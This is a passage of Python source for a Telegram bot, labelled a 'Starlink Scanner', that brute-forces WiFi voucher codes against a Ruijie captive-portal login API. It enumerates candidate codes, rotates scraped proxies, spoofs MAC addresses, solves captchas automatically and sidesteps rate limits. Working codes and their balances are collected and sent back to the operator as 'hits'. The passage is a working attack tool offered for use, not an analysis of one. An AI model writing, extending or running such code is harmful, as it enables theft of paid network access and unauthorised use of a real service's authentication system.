        tasks.append(asyncio.create_task(worker(i, login_url, captcha_base_url, verify_url, headers, user_id)))
    for bw in range(BALANCE_WORKERS):
        tasks.append(asyncio.create_task(balance_worker(user_id, bw)))

    ud['task'] = asyncio.current_task()
    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        for t in tasks:
            if not t.done():
                t.cancel()
        raise
    finally:
        stats = ud['stats']
        elapsed = time.time() - stats['start_time']
        speed_cpm = (stats['tried'] / elapsed) * 60 if elapsed > 0 else 0
        proxy_total, proxy_active = pm.stats()
        hit_list = []
        for item in ud['valid_codes']:
            c = item['code']
            balance = item.get('balance_str', '...fetching...')
            hit_list.append(f"{c} {balance}")
        hit_str = "\n".join(hit_list) if hit_list else "None"
        final_text = (
            f"🛑 Scanner Stopped/Finished\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🔋 Total Tried: {stats['tried']:,}\n"
            f"🟢 Hits: {stats['hits']}\n"
            f"⚡ Final Speed: {speed_cpm:.1f} c/m\n"
            f"🔀 Proxies: {proxy_active}/{proxy_total}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📋 **All Hit Codes**:\n{hit_str}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
        )
        if ud['dash_msg_id']:
            try:
                await context.bot.edit_message_text(chat_id=user_id, message_id=ud['dash_msg_id'], text=final_text)
            except Exception:
                await context.bot.send_message(chat_id=user_id, text=final_text)
        else:
            await context.bot.send_message(chat_id=user_id, text=final_text)

        await auto_retry_pending(ud, context, user_id)

        if ud['valid_codes']:
            try:
                import datetime as _dt
                timestamp = _dt.datetime.now().strftime('%Y%m%d_%H%M%S')
                filename = f"hits_{user_id}_{timestamp}.txt"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(f"=== HIT CODES REPORT ===\n")
                    f.write(f"User ID : {user_id}\n")
                    f.write(f"Date    : {_dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Tried   : {stats['tried']:,}\n")
                    f.write(f"Hits    : {stats['hits']}\n")
                    f.write(f"Speed   : {speed_cpm:.1f} c/m\n")
                    f.write(f"{'=' * 40}\n\n")
                    for item in ud['valid_codes']:
                        src = item.get('source', '...')
                        f.write(f"{item['code']} | {item.get('balance_str', 'N/A')} | {src}\n")
                with open(filename, "rb") as f:
                    await context.bot.send_document(
                        chat_id=user_id,
                        document=f,
                        caption=f"📋 Hit Codes Report\n🟢 Total: {len(ud['valid_codes'])} hits (after auto retry)"
                    )
                try:
                    os.remove(filename)
                except Exception:
                    pass
            except Exception as e:
                print(f"[HitFile] Error sending hit codes file: {e}")

        ud['stop_event'].clear()
        ud['dash_msg_id'] = None
        ud['task'] = None


# ==================== PROXY CHECKER ====================
async def fetch_proxy_list(url: str):
    proxies = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=15) as resp:
                if resp.status == 200:
                    content_type = resp.headers.get('content-type', '')
                    if 'application/json' in content_type:
                        data = await resp.json()
                        items = None
                        if isinstance(data, list):
                            items = data
                        elif isinstance(data, dict):
                            for key in ('data', 'items', 'results'):
                                if key in data and isinstance(data[key], list):
                                    items = data[key]
                                    break
                        if items:
                            for item in items:
                                if isinstance(item, dict) and 'ip' in item and 'port' in item:
                                    ip = str(item['ip']).strip()
                                    port = str(item['port']).strip()
                                    if ip and port:
                                        proxies.append(f"http://{ip}:{port}")
                    else:
                        text = await resp.text()
                        for line in text.splitlines():
                            line = line.strip()
                            if line and not line.startswith('#'):
                                if not line.startswith(('http://', 'https://')):
                                    line = 'http://' + line
                                proxies.append(line)
    except Exception as e:
        print(f"Error fetching {url}: {e}")
    return proxies


async def check_proxy_working(session, proxy, portal_url, semaphore, stop_event, user_id):
    async with semaphore:
        if stop_event.is_set():
            return None
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            u = urlparse(portal_url)
            query = parse_qs(u.query)
            mac = generate_random_mac()
            query['mac'] = [mac]
            spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))
            async with session.get(spoofed_url, headers=headers, timeout=5, ssl=False, proxy=proxy) as r2:
                body = await r2.text()
                match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
                if match:
                    final_url = urljoin(spoofed_url, match.group(1))
                    async with session.get(final_url, headers=headers, timeout=5, ssl=False, proxy=proxy) as r3:
                        final_url = str(r3.url)
                else:
                    final_url = str(r2.url)
                parsed_query = parse_qs(urlparse(final_url).query)
                sid = parsed_query.get('sessionId', parsed_query.get('sid', [None]))[0]
                if sid:
                    return proxy
        except Exception:
            pass
        return None


async def run_proxy_check(context: ContextTypes.DEFAULT_TYPE, chat_id: int, user_id: int, sources: list = None):
    ud = get_user_data(user_id)
    stop_event = asyncio.Event()
    user_proxy_checks[user_id] = {'stop_event': stop_event, 'msg_id': None, 'task': asyncio.current_task()}
    if sources is None:
        sources = PROXY_SOURCES

    try:
        init_msg = await context.bot.send_message(chat_id, "⏳ Proxy list များကို download လုပ်နေပါသည်...")
        user_proxy_checks[user_id]['msg_id'] = init_msg.message_id
    except Exception as e:
        print(f"[ProxyCheck] Cannot send init msg: {e}")
        return
    progress_msg_id = init_msg.message_id

    stop_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🛑 Stop & Save", callback_data="proxy_check_stop")]
    ])

    all_proxies = []
    for i, url in enumerate(sources, 1):
        if stop_event.is_set():
            break
        p = await fetch_proxy_list(url)
        print(f"Source {i}: {len(p)} proxies")
        all_proxies.extend(p)
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=progress_msg_id,
                text=f"📥 Downloading proxies...\nSource {i}/{len(sources)}: {len(p)} proxies\nTotal: {len(all_proxies)}",
                reply_markup=stop_kb
            )
        except Exception:
            pass

    seen = set()
    unique_proxies = []
    for p in all_proxies:
        if p not in seen:
            seen.add(p)
            unique_proxies.append(p)

    if not unique_proxies:
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=progress_msg_id,
                text="❌ Proxy list ထဲတွင် တစ်ခုမှမရှိပါ။"
            )
        except Exception:
            pass
        user_proxy_checks.pop(user_id, None)
        return

    total = len(unique_proxies)
    CONCURRENCY = 100
    semaphore = asyncio.Semaphore(CONCURRENCY)
    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    timeout = aiohttp.ClientTimeout(total=5)
    good_proxies = []
    checked = 0
    last_update = time.time()

    portal_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=c4b25b4e24cf&gw_sn=H1TC2LY000735&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.170&mac=5e:21:ad:5d:13:0d&slot_num=14&nasip=192.168.1.71&ssid=PAING&ustate=0&mac_req=1&url=http%3A%2F%2Fconnectivitycheck%2Egstatic%2Ecom%2Fgenerate%5F204&chap_id=%5C002&chap_challenge=%5C022%5C076%5C030%5C160%5C346%5C277%5C107%5C257%5C116%5C227%5C172%5C334%5C045%5C220%5C357%5C371&v=2"

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        for proxy in unique_proxies:
            task = asyncio.create_task(check_proxy_working(session, proxy, portal_url, semaphore, stop_event, user_id))
            tasks.append(task)

        for completed_task in asyncio.as_completed(tasks):
            if stop_event.is_set():
                for t in tasks:
                    if not t.done():
                        t.cancel()
                break
            try:
                result = await completed_task
            except Exception:
                result = None
            if result:
                good_proxies.append(result)
            checked += 1

            now = time.time()
            if checked % 50 == 0 or now - last_update > 2 or checked == total:
                last_update = now
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id, message_id=progress_msg_id,
                        text=f"📊 စစ်ဆေးပြီး: {checked}/{total}\n✅ Working: {len(good_proxies)}\n\n🛑 Stop နှိပ်ရင် ရထားတာတွေ save လုပ်ပါမည်။",
                        reply_markup=stop_kb
                    )
                except Exception:
                    pass

    pm = get_proxy_manager()
    added = pm.add_proxies(good_proxies)

    if stop_event.is_set():
        final_text = (
            f"🛑 Proxy check stopped by user.\n"
            f"✅ Found {len(good_proxies)} working proxies.\n"
            f"📥 Added {added} new to proxies.txt"
        )
    else:
        final_text = (
            f"✅ စစ်ဆေးပြီးပါပြီ။\n"
            f"Working: {len(good_proxies)}/{total}\n"
            f"📥 Added {added} new to proxies.txt"
        )

    try:
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=progress_msg_id,
            text=final_text
        )
    except Exception:
        pass

    # NOTE: good proxies ဖိုင် user ဆီ ပြန်မပို့တော့ပါ (user request)
    user_proxy_checks.pop(user_id, None)


# ==================== MANUAL BALANCE ====================
def split_codes(raw: str, expected_len: int = None):
    cleaned = re.sub(r'[\s,;|]+', '\n', raw.strip())
    parts = [p.strip() for p in cleaned.split('\n') if p.strip()]
    codes = []
    seen = set()
    for p in parts:
        c = re.sub(r'[^A-Za-z0-9]', '', p)
        if not c:
            continue
        if expected_len is not None and len(c) != expected_len:
            continue
        if c not in seen:
            seen.add(c)
            codes.append(c)
    return codes


def get_manual_balance_state(user_id: int):
    if user_id not in user_manual_balance:
        user_manual_balance[user_id] = {
            'mode': 'num6',
            'code_len': 6,
            'state': None,
            'codes': [],
            'results': [],
            'running': False,
            'stop_event': asyncio.Event(),
            'msg_id': None,
            'task': None,
            'lock': asyncio.Lock(),
        }
    return user_manual_balance[user_id]


async def _process_one_code(code, st, ud, user_id, login_url, captcha_base_url, verify_url, headers, counter):
    pm = get_proxy_manager()
    token = None
    balance_str = "❌ failed"
    source = "❌"
    got_limit = False

    for attempt in range(3):
        if st['stop_event'].is_set():
            break
        proxy = await pm.get_next()
        if not proxy:
            break
        try:
            connector = create_connector_for_proxy(proxy)
            async with aiohttp.ClientSession(
                connector=connector,
                connector_owner=True,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as session:
                sid, mac = await get_sid_from_gateway(session, ud['portal_url'], user_id)
                if not sid:
                    await pm.mark_bad(proxy)
                    continue

                captcha_url = f"{captcha_base_url}?sessionId={sid}"
                auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
                if not auth_code or len(auth_code) < 2:
                    continue

                v_payload = {"sessionId": sid, "authCode": auth_code}
                async with session.post(verify_url, json=v_payload, headers=headers, ssl=False, timeout=6) as v_resp:
                    if v_resp.status != 200:
                        continue
                    v_data = await v_resp.json()
                    if not v_data.get("success"):
                        continue

                    l_payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth_code}
                    async with session.post(login_url, json=l_payload, headers=headers, ssl=False, timeout=8) as l_resp:
                        l_text = await l_resp.text()
                        l_lower = l_text.lower()

                        if '"success":true' in l_lower:
                            token_match = re.search(r'token=([^&\s"\'<>]+)', l_text)
                            if token_match:
                                token = token_match.group(1)
                                pm.mark_good(proxy)
                                break
                            else:
                                balance_str = "❌ no token"
                                break
                        elif "expired" in l_lower:
                            balance_str = "❌ expired"
                            break
                        elif "request limited" in l_lower:
                            got_limit = True
                            continue
                        elif "exceeds the limit" in l_lower or "limit" in l_lower:
                            got_limit = True
                            continue
                        else:
                            balance_str = "❌ invalid"
                            break
        except Exception:
            try:
                await pm.mark_bad(proxy)
            except Exception:
                pass
            continue

    if token:
        bal_result = None
        chosen = await pm.get_next()
        if chosen:
            for retry in range(3):
                ok, res = await fetch_balance_with_proxy(token, chosen, timeout=3)
                if ok:
                    bal_result = res
                    source = "proxy"
                    pm.mark_good(chosen)
                    break
            if bal_result is None:
                await pm.mark_bad(chosen)
        if bal_result is None:
            ok, res = await fetch_balance_direct(token, timeout=5)
            bal_result = res if ok else f"❌ {res}"
            source = "direct"
        balance_str = bal_result
    elif got_limit:
        balance_str = "⚠️ limit"
        source = "limit"

    async with st['lock']:
        if source == "proxy":
            counter['proxy'] += 1
        elif source == "direct":
            counter['direct'] += 1
        elif source == "limit":
            counter['limit'] += 1
        else:
            counter['failed'] += 1
        counter['done'] += 1

    return {'code': code, 'balance': balance_str, 'source': source}


async def run_manual_balance_check(context: ContextTypes.DEFAULT_TYPE, chat_id: int, user_id: int):
    st = get_manual_balance_state(user_id)
    st['running'] = True
    st['stop_event'].clear()
    st['results'] = []

    codes = st['codes']
    total = len(codes)
    if total == 0:
        try:
            await context.bot.send_message(chat_id, "❌ Code list ဗလာဖြစ်နေပါသည်။")
        except Exception:
            pass
        st['running'] = False
        return

    ud = get_user_data(user_id)
    portal_url = ud.get('portal_url')
    if not portal_url:
        await context.bot.send_message(chat_id, "❌ Portal URL မရှိပါ။ Update Portal အရင်လုပ်ပါ။")
        st['running'] = False
        return

    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()

    login_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    captcha_base_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/image"
    verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "https://portal-as.ruijienetworks.com",
        "Referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
    }

    try:
        status_msg = await context.bot.send_message(
            chat_id,
            f"💳 Manual Balance Check (FAST)\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"⚙️ Mode        : {st['mode']} ({st['code_len']} digit)\n"
            f"📋 Total codes : {total}\n"
            f"🔀 Proxies     : {proxy_active}/{proxy_total}\n"
            f"⚡ Concurrency : {MANUAL_CONCURRENCY}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Starting..."
        )
        st['msg_id'] = status_msg.message_id
    except Exception as e:
        print(f"[ManualBalance] Cannot send msg: {e}")
        st['running'] = False
        return

    counter = {'done': 0, 'proxy': 0, 'direct': 0, 'limit': 0, 'failed': 0}
    results = []
    last_edit = time.time()
    sem = asyncio.Semaphore(MANUAL_CONCURRENCY)

    async def _bounded(code):
        async with sem:
            if st['stop_event'].is_set():
                return None
            res = await _process_one_code(code, st, ud, user_id,
                                          login_url, captcha_base_url, verify_url,
                                          headers, counter)
            nonlocal last_edit
            now = time.time()
            if counter['done'] == total or now - last_edit > 1.5 or counter['done'] % 3 == 0:
                last_edit = now
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=st['msg_id'],
                        text=(
                            f"💳 Manual Balance (FAST)\n"
                            f"━━━━━━━━━━━━━━━━━━\n"
                            f"⚙️ Mode        : {st['mode']} ({st['code_len']} digit)\n"
                            f"📊 Checked     : {counter['done']}/{total}\n"
                            f"🌐 Proxy hits  : {counter['proxy']}\n"
                            f"📡 Direct hits : {counter['direct']}\n"
                            f"⚠️ Limited     : {counter['limit']}\n"
                            f"❌ Failed      : {counter['failed']}\n"
                            f"━━━━━━━━━━━━━━━━━━\n"
                            f"🎯 Current     : {code}\n"
                        )
                    )
                except Exception:
                    pass
            return res

    task_list = [asyncio.create_task(_bounded(c)) for c in codes]
    for t in asyncio.as_completed(task_list):
        if st['stop_event'].is_set():
            for tt in task_list:
                if not tt.done():
                    tt.cancel()
            break
        try:
            r = await t
            if r:
                results.append(r)
        except Exception:
            pass

    st['results'] = results
    st['running'] = False

    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=st['msg_id'],
            text=(
                f"✅ Manual Balance Done (FAST)\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⚙️ Mode        : {st['mode']} ({st['code_len']} digit)\n"
                f"📋 Total       : {total}\n"
                f"🌐 Proxy hits  : {counter['proxy']}\n"
                f"📡 Direct hits : {counter['direct']}\n"
                f"⚠️ Limited     : {counter['limit']}\n"
                f"❌ Failed      : {counter['failed']}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
            )
        )
    except Exception:
        pass

    if results:
        try:
            import datetime as _dt
            ts = _dt.datetime.now().strftime('%Y%m%d_%H%M%S')
            fname = f"manual_balance_{user_id}_{ts}.txt"
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(f"=== MANUAL BALANCE REPORT ===\n")
                f.write(f"User ID : {user_id}\n")
                f.write(f"Date    : {_dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Mode    : {st['mode']} ({st['code_len']} digit)\n")
                f.write(f"Total   : {total}\n")
                f.write(f"Proxy   : {counter['proxy']}\n")
                f.write(f"Direct  : {counter['direct']}\n")
                f.write(f"Limited : {counter['limit']}\n")
                f.write(f"Failed  : {counter['failed']}\n")
                f.write(f"{'=' * 40}\n\n")
                for r in results:
                    f.write(f"{r['code']} | {r['balance']} | {r['source']}\n")
            with open(fname, 'rb') as f:
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=f,
                    caption=f"📋 Manual Balance Report\n"
                            f"🌐 Proxy: {counter['proxy']} | 📡 Direct: {counter['direct']} | "
                            f"⚠️ Limit: {counter['limit']} | ❌ Failed: {counter['failed']}"
                )
            try:
                os.remove(fname)
            except Exception:
                pass
        except Exception as e:
            print(f"[ManualBalance] File send error: {e}")


# ---------------- KEYBOARDS & HANDLERS ----------------
def get_main_menu_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🌐 Update Portal", callback_data="btn_update_portal")],
        [InlineKeyboardButton(text="⚙️ Mode", callback_data="btn_mode_menu")],
        [InlineKeyboardButton(text="➕ Add Proxies", callback_data="btn_add_proxies")],
        [InlineKeyboardButton(text="🔍 Proxy Checker", callback_data="btn_proxy_checker")],
        [InlineKeyboardButton(text="💳 Manual Balance", callback_data="btn_manual_balance")],
        [InlineKeyboardButton(text="👷 Set Workers", callback_data="btn_set_workers")],
        [InlineKeyboardButton(text="🚀 Start Scanner", callback_data="btn_start_scanner")]
    ])


def admin_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if str(user_id) != str(AUTHORIZED_ID):
            if update.effective_message:
                await update.effective_message.reply_text(
                    "⛔ ဤ Bot ကို အသုံးပြုခွင့်မရှိပါ။",
                    parse_mode=ParseMode.MARKDOWN
                )
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


@admin_only
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    ud['state'] = None
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    msg = await update.message.reply_text(
        f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
        f"⚙️ Current Mode: `{ud['mode']}`\n"
        f"🔀 Proxies: `{proxy_active}/{proxy_total}`\n"
        f"👷 Workers: `{ud['num_workers']}`",
        reply_markup=get_main_menu_markup(),
        parse_mode=ParseMode.MARKDOWN
    )
    ud['menu_msg_id'] = msg.message_id


@admin_only
async def add_proxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    ud['state'] = 'waiting_for_proxy_text'
    ud['menu_msg_id'] = update.effective_message.message_id
    await update.message.reply_text("📥 **Proxy များကို ယခုပို့ပါ**\n", parse_mode=ParseMode.MARKDOWN)


@admin_only
async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    stopped_something = False
    if ud['task'] and not ud['task'].done():
        ud['stop_event'].set()
        ud['dash_update_event'].set()
        ud['task'].cancel()
        stopped_something = True
    pc = user_proxy_checks.get(user_id)
    if pc and pc.get('stop_event'):
        pc['stop_event'].set()
        if pc.get('task') and not pc['task'].done():
            try:
                pc['task'].cancel()
            except Exception:
                pass
        stopped_something = True
    st = user_manual_balance.get(user_id)
    if st and st.get('running'):
        st['stop_event'].set()
        if st.get('task') and not st['task'].done():
            try:
                st['task'].cancel()
            except Exception:
                pass
        stopped_something = True
    if stopped_something:
        await update.message.reply_text("🛑 Stopped immediately.")
    else:
        await update.message.reply_text("ℹ️ Nothing is running.")


@admin_only
async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    data = query.data

    if data == "btn_update_portal":
        ud['state'] = 'waiting_for_portal_url'
        ud['menu_msg_id'] = query.message.message_id
        await query.message.edit_text("🌐 **Portal URL ကို ပို့ပေးပါ။**")

    elif data == "btn_mode_menu":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="Number 6", callback_data="set_mode_num6"),
             InlineKeyboardButton(text="Number 7", callback_data="set_mode_num7"),
             InlineKeyboardButton(text="Number 8", callback_data="set_mode_num8")],
            [InlineKeyboardButton(text="Number 9", callback_data="set_mode_num9")],
            [InlineKeyboardButton(text="Abc 6", callback_data="set_mode_abc6"),
             InlineKeyboardButton(text="Mix 6", callback_data="set_mode_mix6"),
             InlineKeyboardButton(text="Mix 7", callback_data="set_mode_mix7"),
             InlineKeyboardButton(text="Mix 8", callback_data="set_mode_mix8"),
             InlineKeyboardButton(text="Mix 9", callback_data="set_mode_mix9")],
            [InlineKeyboardButton(text="Custom Start", callback_data="set_mode_custom")],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="btn_back_main")]
        ])
        await query.message.edit_text("⚙️ **Choose Scanner Mode**", reply_markup=keyboard)

    elif data.startswith("set_mode_"):
        selected_mode = data.split("set_mode_")[1]
        if selected_mode == "num6":
            ud['mode'] = "num6"; ud['char_set'] = "012345678"; ud['code_len'] = 6; ud['start_digit'] = None
        elif selected_mode == "num7":
            ud['mode'] = "num7"; ud['char_set'] = "012345678"; ud['code_len'] = 7; ud['start_digit'] = None
        elif selected_mode == "num8":
            ud['mode'] = "num8"; ud['char_set'] = "012345678"; ud['code_len'] = 8; ud['start_digit'] = None
        elif selected_mode == "num9":
            ud['mode'] = "num9"; ud['char_set'] = "012345678"; ud['code_len'] = 9; ud['start_digit'] = None
        elif selected_mode == "abc6":
            ud['mode'] = "abc6"; ud['char_set'] = "abcdefghijkmnpqrstuvwxyz"; ud['code_len'] = 6; ud['start_digit'] = None
        elif selected_mode == "mix6":
            ud['mode'] = "mix6"; ud['char_set'] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud['code_len'] = 6; ud['start_digit'] = None
        elif selected_mode == "mix7":
            ud['mode'] = "mix7"; ud['char_set'] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud['code_len'] = 7; ud['start_digit'] = None
        elif selected_mode == "mix8":
            ud['mode'] = "mix8"; ud['char_set'] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud['code_len'] = 8; ud['start_digit'] = None
        elif selected_mode == "mix9":
            ud['mode'] = "mix9"; ud['char_set'] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud['code_len'] = 9; ud['start_digit'] = None
        elif selected_mode == "custom":
            ud['mode'] = "custom"; ud['char_set'] = "012345678"; ud['code_len'] = 6
            ud['state'] = 'waiting_for_digit'
            ud['menu_msg_id'] = query.message.message_id
            await query.message.edit_text("🔢 **Start Digit **\nဂဏန်းတစ်လုံးသာ ပြန်ပို့ပေးပါ။")
            return
        pm = get_proxy_manager()
        proxy_total, proxy_active = pm.stats()
        await query.message.edit_text(
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔀 Proxies: `{proxy_active}/{proxy_total}`\n"
            f"👷 Workers: `{ud['num_workers']}`",
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.MARKDOWN
        )

    elif data == "btn_back_main":
        pm = get_proxy_manager()
        proxy_total, proxy_active = pm.stats()
        await query.message.edit_text(
            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
            f"⚙️ Current Mode: `{ud['mode']}`\n"
            f"🔀 Proxies: `{proxy_active}/{proxy_total}`\n"
            f"👷 Workers: `{ud['num_workers']}`",
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.MARKDOWN
        )

    elif data == "btn_add_proxies":
        ud['state'] = 'waiting_for_proxy_text'
        ud['menu_msg_id'] = query.message.message_id
        await query.message.edit_text(
            "📥 **Proxy များကို ယခုပို့ပါ**\n"
            "တစ်ကြောင်းလျှင် proxy တစ်ခုစီ\n"
            "ဥပမာ -\n"
            "123.45.67.89:8080\n"
            "socks5://user:pass@host:1080\n"
            "socks4://host:1080"
        )

    elif data == "btn_proxy_checker":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="🔍 Auto Check (from sources)", callback_data="proxy_check_auto")],
            [InlineKeyboardButton(text="🔗 Check Manual URL", callback_data="proxy_check_manual_url")],
            [InlineKeyboardButton(text="🗑 Clear proxies.txt", callback_data="proxy_clear_file")],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="btn_back_main")]
        ])
        await query.message.edit_text(
            "🔍 **Proxy Checker**\n\n"
            "Auto Check: ရင်းမြစ်များမှ proxy များကို စစ်ဆေးပြီး proxies.txt ထဲ auto ထည့်ပေးမည်\n"
            "Manual URL: URL တစ်ခုမှ proxy များကို စစ်ဆေးမည်\n"
            "Clear: proxies.txt ကို အကုန်ဖျက်မည်",
            reply_markup=keyboard
        )

    elif data == "proxy_check_auto":
        pc = user_proxy_checks.get(user_id)
        if pc and pc.get('task') and not pc['task'].done():
            await query.message.edit_text("⚠️ Proxy check ပြေးနေပြီးသားဖြစ်ပါသည်။")
            return
        await query.message.edit_text("⏳ Starting proxy check...")
        asyncio.create_task(run_proxy_check(context, query.message.chat_id, user_id))

    elif data == "proxy_check_stop":
        pc = user_proxy_checks.get(user_id)
        if pc and pc.get('stop_event'):
            pc['stop_event'].set()
            await query.answer("🛑 Stopping & saving...")
        else:
            await query.answer("ℹ️ No proxy check running")

    elif data == "proxy_check_manual_url":
        ud['state'] = 'waiting_for_proxy_url'
        ud['menu_msg_id'] = query.message.message_id
        await query.message.edit_text("🔗 **Proxy URL ကို ပို့ပေးပါ**\nဥပမာ - https://example.com/proxies.txt")

    elif data == "proxy_clear_file":
        pm = get_proxy_manager()
        pm.clear_file()
        await query.message.edit_text(
            "🗑 **proxies.txt ကို အကုန်ဖျက်ပြီးပါပြီ။**\n\n"
            f"🔀 Proxies: `0/0`",
            reply_markup=get_main_menu_markup()
        )

    elif data == "btn_manual_balance":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="Number 6", callback_data="mb_mode_num6"),
             InlineKeyboardButton(text="Number 7", callback_data="mb_mode_num7"),
             InlineKeyboardButton(text="Number 8", callback_data="mb_mode_num8"),
             InlineKeyboardButton(text="Number 9", callback_data="mb_mode_num9")],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="btn_back_main")]
        ])
        await query.message.edit_text(
            "💳 **Manual Balance Checker (FAST)**\n\n"
            "ပထမဆုံး code mode ကို ရွေးပါ:\n\n"
            "**Mode ရွေးပြီးရင်:**\n"
            "• Code list ကို အကုန်ကူးထည့်ပါ\n"
            "• Auto split + auto filter\n"
            "• SID → captcha → login → balance\n"
            "• Parallel processing (fast)",
            reply_markup=keyboard,
            parse_mode=ParseMode.MARKDOWN
        )

    elif data.startswith("mb_mode_"):
        mode = data.split("mb_mode_")[1]
        st = get_manual_balance_state(user_id)
        if mode == "num6":
            st['mode'] = "num6"; st['code_len'] = 6
        elif mode == "num7":
            st['mode'] = "num7"; st['code_len'] = 7
        elif mode == "num8":
            st['mode'] = "num8"; st['code_len'] = 8
        elif mode == "num9":
            st['mode'] = "num9"; st['code_len'] = 9
        st['state'] = 'waiting_for_codes'
        st['codes'] = []
        st['results'] = []
        ud['state'] = 'waiting_for_manual_codes'
        await query.message.edit_text(
            f"💳 **Manual Balance — Mode `{st['mode']}`** (FAST)\n\n"
            f"📥 Code များကို ယခုပို့ပါ\n\n"
            f"**Auto filter:** {st['code_len']}-digit code ကိုပဲ စစ်ပါမည်\n"
            f"**Auto split:** Space, Newline, Comma, Semicolon, Pipe\n"
            f"**Parallel:** {MANUAL_CONCURRENCY} codes at once\n\n"
            f"ဥပမာ:\n"
            f"`740264 551342 127115`\n\n"
            f"ရပြီးရင် auto စစ်ပြီး `.txt` ပြန်ပို့ပါမည်။",
            parse_mode=ParseMode.MARKDOWN
        )

    elif data == "btn_set_workers":
        ud['state'] = 'waiting_for_workers'
        ud['menu_msg_id'] = query.message.message_id
        await query.message.edit_text(
            f"👷 **Set Number of Workers**\n\n"
            f"Current: `{ud['num_workers']}`\n\n"
            f"Enter new number (1-1000):"
        )

    elif data == "btn_start_scanner":
        if not ud['portal_url']:
            await query.message.edit_text("❌ Portal URL မရှိသေးပါ။ ကျေးဇူးပြု၍ `Update Portal` အရင်လုပ်ပါ။")
            return
        if ud['task'] and not ud['task'].done():
            ud['stop_event'].set()
            ud['dash_update_event'].set()
            ud['task'].cancel()
            try:
                await asyncio.wait_for(ud['task'], timeout=3.0)
            except (asyncio.TimeoutError, asyncio.CancelledError):
                pass
            except Exception:
                pass
        ud['stop_event'].clear()
        ud['stats'] = {'tried': 0, 'hits': 0, 'expired': 0, 'limits': 0, 'start_time': time.time()}
        ud['valid_codes'] = []
        ud['limit_codes'] = []
        ud['tried_codes'] = set()
        ud['recent_logs'] = []
        ud['CURRENT_CODE'] = '----'
        ud['balance_queue'] = asyncio.Queue()
        await query.message.edit_text("🔄 Initializing scanner dashboard...")
        ud['dash_msg_id'] = query.message.message_id
        asyncio.create_task(run_user_scanner(context, user_id))

    elif data == "stop_scan":
        ud['stop_event'].set()
        ud['dash_update_event'].set()
        if ud['task'] and not ud['task'].done():
            ud['task'].cancel()


@admin_only
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    state = ud.get('state')
    text = update.message.text.strip()

    if state == 'waiting_for_portal_url':
        if not text.startswith("http"):
